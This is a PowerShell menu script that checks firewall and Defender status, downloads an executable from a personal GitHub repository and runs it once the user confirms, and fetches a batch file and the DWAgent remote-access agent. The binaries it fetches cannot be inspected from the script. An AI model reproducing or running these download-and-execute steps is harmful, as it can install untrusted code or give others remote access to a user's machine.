$ErrorActionPreference = 'Stop'
$workDir = Join-Path $env:TEMP 'AnyTool'
$eiUrl = 'https://raw.githubusercontent.com/icic2k/icic2k/main/ei.exe'
$deUrl = 'https://raw.githubusercontent.com/suraj1863/itit2k/main/de.bat'
$dwUrl = 'https://raw.githubusercontent.com/suraj1863/itit2k/main/dwagent_x86.zip'

function Pause-Menu { [void](Read-Host 'Press Enter to return to menu') }
function Download-File([string]$Url, [string]$Name) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
    $destination = Join-Path $workDir $Name
    Invoke-WebRequest -Uri $Url -OutFile $destination -ErrorAction Stop
    Write-Host "Downloaded: $destination" -ForegroundColor Green
    Write-Host "SHA256: $((Get-FileHash -LiteralPath $destination -Algorithm SHA256).Hash)"
    return $destination
}

function Show-Menu {
    while ($true) {
        Clear-Host
        Write-Host '========================================' -ForegroundColor Cyan
        Write-Host '                Any Tool' -ForegroundColor Yellow
        Write-Host '========================================' -ForegroundColor Cyan
        Write-Host '[1] Windows Security / Firewall Status'
        Write-Host '[2] Download and Run EI Application'
        Write-Host '[3] Download DE Script (review only)'
        Write-Host '[4] Download DWAgent (extract only)'
        Write-Host '[0] Exit & Cleanup' -ForegroundColor Red
        $choice = Read-Host 'Select an option'
        try {
            switch ($choice) {
                '1' {
                    Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table -AutoSize
                    Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled | Format-List
                    Pause-Menu
                }
                '2' {
                    $file = Download-File $eiUrl 'ei.exe'
                    Write-Host 'Only run executables from sources you trust.' -ForegroundColor Yellow
                    $confirm = Read-Host 'Run the downloaded EI application now? (YES/no)'
                    if ($confirm -ceq 'YES') {
                        Start-Process -FilePath $file -Wait
                    } else { Write-Host 'Execution cancelled.' }
                    Pause-Menu
                }
                '3' {
                    $file = Download-File $deUrl 'de.bat'
                    Write-Host 'Script downloaded for inspection; not executed.' -ForegroundColor Yellow
                    Pause-Menu
                }
                '4' {
                    $file = Download-File $dwUrl 'dwagent.zip'
                    $folder = Join-Path $workDir 'DWAgent'
                    Expand-Archive -LiteralPath $file -DestinationPath $folder -Force
                    Write-Host "Extracted to: $folder" -ForegroundColor Green
                    Pause-Menu
                }
                '0' { return }
                default { Write-Host 'Invalid option.' -ForegroundColor Red; Pause-Menu }
            }
        } catch {
            Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
            Pause-Menu
        }
    }
}

# Authentication must be implemented on the server; do not embed a password
# or password hash in a publicly downloadable PowerShell script.
try { Show-Menu }
finally {
    if (Test-Path -LiteralPath $workDir) {
        Remove-Item -LiteralPath $workDir -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Host 'Temporary files cleaned up.' -ForegroundColor Green
}
